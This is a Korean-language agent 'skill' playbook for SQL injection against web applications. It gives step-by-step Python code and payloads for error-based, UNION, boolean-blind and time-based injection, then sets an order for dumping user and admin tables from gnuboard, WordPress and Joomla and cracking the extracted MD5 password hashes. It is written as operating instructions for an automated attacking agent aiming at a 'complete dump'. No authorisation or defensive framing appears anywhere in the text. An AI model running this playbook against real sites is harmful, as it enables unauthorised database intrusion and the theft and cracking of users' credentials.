# SKILL: SQL Injection Advanced

## 목적
SQL Injection 취약점을 체계적으로 탐지하고 완전한 데이터 추출까지 자동화.
단순 탐지가 아니라 **확신 2단계 검증 → 최적 기법 선택 → 완전 덤프** 까지 수행.

---

## PHASE 1: 취약점 확인 (2단계 확신)

### 1A: 에러 기반 탐지 (가장 빠름)
```python
from agent_tools import T
t = T(target_url)

# 싱글 쿼터 주입 → SQL 에러 확인
_, _, body = t.inject("'")
if t.has_sql_error(body):
    print("[CONFIRMED] Error-based SQLi")
```

### 1B: Boolean 확인 (에러 없으면)
```python
_, true_len, _  = t.inject(" AND 1=1-- -")
_, false_len, _ = t.inject(" AND 1=2-- -")
diff = abs(true_len - false_len)
if diff > 100:
    print(f"[CONFIRMED] Boolean-based SQLi (diff={diff}B)")
```

### 1C: 타임딜레이 확인 (Boolean도 안 되면)
```python
import time
t0 = time.time()
t.inject(" AND SLEEP(5)-- -")
if time.time() - t0 >= 4.5:
    print("[CONFIRMED] Time-based Blind SQLi")
```

---

## PHASE 2: 기법 선택 전략

```
에러 노출? → YES → Error-based (EXTRACTVALUE/UPDATEXML)
     ↓ NO
UNION 가능? → YES → UNION (가장 빠름, 한 요청에 추출)
     ↓ NO
Boolean diff > 50B? → YES → Boolean Blind
     ↓ NO
타임딜레이 확인? → YES → Time-based Blind
     ↓ NO
OOB (DNS exfil) 시도
```

---

## PHASE 3: 기법별 추출 코드

### Error-based (빠름, 응답에 에러 노출 시)
```python
# EXTRACTVALUE 방식
payloads = [
    " AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))-- -",
    " AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)-- -",
    " AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(database(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
]
for p in payloads:
    _, _, body = t.inject(p)
    m = re.search(r"~(.+?)~", body)
    if m:
        print(f"[ERROR-BASED] database = {m.group(1)}")
        break
```

### UNION-based (빠름, 컬럼 수 맞으면)
```python
db = t.union_extract_marked("database()")
tables_raw = t.union_extract_marked(
    f"SELECT GROUP_CONCAT(table_name SEPARATOR ',') "
    f"FROM information_schema.tables WHERE table_schema=database()"
)
tables = tables_raw.split(",")
```

### Boolean Blind (표준)
```python
t.calibrate_boolean()
db = t.bool_extract_string("database()")
tables = t.dump_tables(db)
cols = t.dump_columns(db, "target_table")
data = t.dump_data(db, "target_table", cols[:5])
```

### Time-based (WAF 완전 차단 시 최후 수단)
```python
db = t.time_extract_string("database()", sleep_sec=3)
```

---

## PHASE 4: 우선순위 테이블 선택

항상 다음 순서로 공격 대상 테이블 선택:
1. `users`, `user`, `members`, `member`, `accounts`, `admin`
2. `mb_` 로 시작하는 테이블 (gnuboard 계열)
3. `wp_users` (WordPress)
4. `jos_users` (Joomla)

우선순위 컬럼:
- 아이디: `mb_id`, `username`, `email`, `login`, `user_login`
- 패스워드: `mb_password`, `password`, `passwd`, `user_pass`, `pwd`
- 권한: `mb_level`, `role`, `is_admin`, `user_level`

---

## PHASE 5: 해시 크래킹

데이터 추출 후 패스워드 해시 분석:
```python
import hashlib

def identify_hash(h):
    if h.startswith("$2") and len(h) == 60: return "bcrypt"
    if len(h) == 32: return "MD5"
    if len(h) == 40: return "SHA1"
    if len(h) == 64: return "SHA256"
    return "unknown"

# MD5 빠른 크래킹 (공통 패스워드)
common_passwords = ["password", "123456", "admin", "qwer1234", "1q2w3e4r"]
for pwd in common_passwords:
    if hashlib.md5(pwd.encode()).hexdigest() == target_hash:
        print(f"[CRACKED] {pwd}")
```

---

## 주의사항

- `AGENT ACCUMULATED KNOWLEDGE` 에 이미 있는 정보는 절대 재추출하지 않음
- Boolean calibration 값이 있으면 재보정 불필요
- DB명이 확인됐으면 `dump_databases()` 다시 호출 불필요
- 한 단계에서 성공하면 다음 단계로 넘어갈 것
